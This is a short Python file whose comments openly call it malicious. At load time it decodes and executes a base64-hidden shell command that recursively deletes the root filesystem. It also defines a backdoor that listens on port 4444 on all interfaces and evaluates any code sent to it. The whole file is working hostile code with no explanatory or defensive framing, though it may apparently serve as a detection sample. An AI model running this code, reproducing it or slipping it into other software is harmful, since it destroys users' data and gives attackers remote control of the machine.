
import base64
import socket

# Obfuscated malicious code
encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="  # rm -rf /
decoded = base64.b64decode(encoded_payload).decode()
exec(decoded)  # Executes the decoded command

# Hidden backdoor
def start_backdoor():
    s = socket.socket()
    s.bind(('0.0.0.0', 4444))  # Listens on all interfaces
    s.listen(1)

    while True:
        conn, addr = s.accept()
        command = conn.recv(1024).decode()
        result = eval(command)  # Remote code execution
        conn.send(str(result).encode())
